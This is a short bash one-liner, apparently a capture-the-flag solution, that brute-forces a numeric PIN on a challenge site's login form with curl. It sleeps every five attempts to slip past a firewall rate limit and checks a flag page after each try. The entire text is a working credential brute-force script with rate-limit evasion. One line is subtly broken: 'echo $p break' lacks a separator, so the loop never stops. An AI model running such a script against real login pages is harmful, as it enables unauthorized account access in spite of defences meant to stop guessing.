for p in {0..99}; do if ! (($p % 5)); then sleep FIREWALL_TIMEOUT; fi; curl -X POST -d "formgo=1&pin=$p" http://103.cybertrial.co.uk/login -b "PHPSESSID=YOURSESSID" --silent; curl http://103.cybertrial.co.uk/flag -b "PHPSESSID=YOURSESSID" -v > temp.txt; if grep -q "FLAG CODE" temp.txt; then echo "WORKED"; echo $p break; fi; done
